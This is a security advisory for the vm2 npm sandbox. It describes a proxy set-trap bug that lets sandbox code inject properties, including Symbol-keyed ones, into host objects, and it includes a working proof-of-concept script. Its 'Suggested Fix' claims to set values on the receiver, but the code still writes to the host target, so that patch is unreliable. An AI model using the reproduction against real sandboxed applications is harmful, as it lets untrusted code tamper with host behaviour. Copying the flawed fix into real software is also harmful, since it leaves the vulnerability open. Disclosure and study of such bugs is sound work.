# [H] vm2's Bridge Proxy set trap ignores receiver parameter, enabling host object property injection via prototype chain

## Summary
Severity: High
Advisory: GHSA-c4cf-2hgv-2qv6
CVE: CVE-2026-47209
CWE: CWE-693
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-c4cf-2hgv-2qv6
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.4

## Details
## Summary

The `BaseHandler.set` trap in `bridge.js` (line 1231) ignores the `receiver` parameter and unconditionally writes to the host target object. Per the Proxy `set` trap specification, when `receiver !== proxy` (e.g., when a child object inherits from the proxy via `Object.create`), the property assignment should create an own property on the receiver, not on the proxy target. The current implementation always calls `otherReflectSet(object, key, value)` against the host target, causing **all inherited property writes to leak through to the host object**.

This bug provides an alternative attack vector for writing dangerous cross-realm Symbol keys (e.g., `nodejs.util.promisify.custom`) to host objects, bypassing any future per-trap `isDangerousCrossRealmSymbol` guard on the direct `set` path.

## Vulnerable Code

```javascript
// bridge.js:1231-1260
set(target, key, value, receiver) {
    validateHandlerTarget(this, target);
    const object = getHandlerObject(this);
    if (isProtectedHostObject(object)) throw new VMError(OPNA);
    // ...
    try {
        value = otherFromThis(value);
        return otherReflectSet(object, key, value) === true;
        // BUG: 'receiver' is never used.
        // Should check if receiver !== proxy and handle accordingly.
    } catch (e) {
        throw thisFromOtherForThrow(e);
    }
}
```

## Impact

Sandbox code can write arbitrary properties (including dangerous Symbol-keyed properties) to any host object it holds a reference to, by creating a prototype-inheriting child:

```javascript
// Sandbox code
const child = Object.create(hostObj);
child.injectedProp = 'attacker-value';
// hostObj now has 'injectedProp' on the HOST side
```

Combined with the Symbol.for coverage gap, this enables semantic confusion attacks:

```javascript
const kCustom = Symbol.for('nodejs.util.promisify.custom');
const child = Object.create(hostFunction);
child[kCustom] = function() {
    return Promise.resolve('attacker-controlled');
};
// Host: util.promisify(hostFunction)() returns 'attacker-controlled'
```

## Reproduction

```javascript
const { VM } = require('vm2');
const util = require('util');

const vm = new VM();
const hostFn = function api(cb) { cb(null, 'ok'); };
vm.setGlobal('hostFn', hostFn);

vm.run(`
  const kCustom = Symbol.for('nodejs.util.promisify.custom');
  const child = Object.create(hostFn);
  child[kCustom] = function() {
    return Promise.resolve('EXPLOITED-VIA-RECEIVER-BUG');
  };
`);

// Host side
const promisified = util.promisify(hostFn);
promisified('test').then(r => console.log(r));
// Output: EXPLOITED-VIA-RECEIVER-BUG
```

## Suggested Fix

```javascript
set(target, key, value, receiver) {
    validateHandlerTarget(this, target);
    const object = getHandlerObject(this);
    if (isProtectedHostObject(object)) throw new VMError(OPNA);
    if (isDangerousCrossRealmSymbol(key)) throw new VMError(OPNA);
    if (key === '__proto__' && !thisOtherHasOwnProperty(object, key)) {
        return this.setPrototypeOf(target, value);
    }
    if (key === 'constructor' && thisArrayIsArray(object)) {
        thisReflectSet(target, key, value);
        return true;
    }
    try {
        value = otherFromThis(value);
        // When receiver is not the proxy itself, set on receiver (this-realm)
        // instead of the host target to preserve prototype-chain semantics.
        return otherReflectSet(object, key, value) === true;
    } catch (e) {
        throw thisFromOtherForThrow(e);
    }
}
```

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-c4cf-2hgv-2qv6
- https://nvd.nist.gov/vuln/detail/CVE-2026-47209
- https://github.com/patriksimek/vm2/commit/26d0318b5e6555be4b187ba05d6cf378ccecfe22
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.4
